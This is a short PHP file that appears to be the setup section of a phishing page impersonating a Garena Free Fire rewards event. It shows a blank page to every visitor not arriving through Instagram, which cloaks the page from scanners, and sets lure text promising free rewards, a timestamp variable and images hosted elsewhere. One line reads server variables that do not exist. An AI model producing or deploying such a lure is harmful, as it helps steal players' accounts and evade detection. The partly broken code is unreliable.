<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'Instagram') === false) {
    echo "";
    exit;
}

$serverV6 = $_SERVER['REQUEST'] . '://' . $_SERVER['HTTPS_HOST'];

$domain = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'];
?>
<?php
date_default_timezone_set('Asia/Kolkata');
$jamasuk = date('l, d-m-Y h:i:s');
$yearNow = date('Y');

$title = 'Garena Free Fire Mobile Event';
$description = 'Collect your special rewards at the Royale Pas Event. This opportunity is limited and without the need for topup. Collect your rewards now!';
$copyright = 'Free Fire';
$theme = '#000';
$image = 'https://i.postimg.cc/T3pQDzpB/yV.png';
$icon = 'https://i.postimg.cc/T3pQDzpB/yV.png';
?>